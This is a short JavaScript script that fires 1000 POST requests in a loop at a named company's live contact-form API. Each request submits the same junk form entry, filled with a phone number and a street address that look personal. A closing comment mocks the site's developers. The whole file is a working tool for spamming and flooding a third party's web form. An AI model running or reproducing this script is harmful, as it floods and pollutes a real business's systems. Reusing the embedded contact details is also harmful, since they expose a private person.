import axios from "axios";

const data = {
  formGuid: "9049a38d-35d1-44c4-b44a-a51936cb7faf",
  culture: "",
  nodeId: 1541,
  userIpAddress: "",
  fields:
    '{"name":"aaaa","email":"aaa@aaa.com","subject":"I am an employer looking to hire.","company":"aaaa","phonenumber":"05427333289","address":"BAĞBAŞI MAHALLESİ VATAN CADDESİ NO:95, CEVAT AKŞİT ERKEK KYK YURDU","city":"Pamukkale","state":"Denizli","zipcode":"20160","howcankforcehelpyou":"xyz"}',
};
const istekAt = async () => {
  try {
    const response = await axios.post(
      "https://www.kforce.com/umbraco/api/formsapi/createrecord",
      data
    );
    console.log("Request successful:", response.data);
  } catch (error) {
    console.error("Error:", error.message);
  }
};

for (let index = 0; index < 1000; index++) {
  console.log(index + " times request sent.");
  istekAt();
}


//your restapi developers suck. wtf kind of json parsing is that? 
